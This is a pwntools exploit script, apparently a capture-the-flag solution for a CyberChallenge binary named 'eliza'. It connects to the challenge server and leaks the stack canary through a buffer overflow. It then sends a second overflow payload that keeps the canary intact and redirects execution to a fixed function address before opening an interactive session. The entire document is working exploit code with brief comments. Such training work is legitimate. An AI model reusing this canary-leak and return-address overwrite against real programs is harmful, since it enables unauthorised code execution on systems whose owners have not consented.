from time import sleep

from pwn import *

exe = ELF("/home/alessio/Scrivania/tools/CTFs/CyberChallenge/Week 10/2-eliza/eliza")
context.binary = exe
HOST = "eliza.challs.cyberchallenge.it"
PORT = 6011
p = remote(HOST, PORT)

print("[+] Exploiting...")
p.send('a' * 72 + 'x')  # Send 72 "a" and 1 'x' to print the address of canary
p.recvuntil('Sorry, \"')
line = p.recvline().strip()  # save the string of address
x_pos = line.find(b'x')  # find every 'x'
canary = b'\x00' + line[x_pos + 1:x_pos + 8]  # rebuild address of canary
payload = b"\n" * 72 + canary + b"AAAAAAAA" + p64(0x00400897)  # send address of canary plus and address of funcion
p.sendlineafter("Ask me anything...\n", payload)
p.interactive()
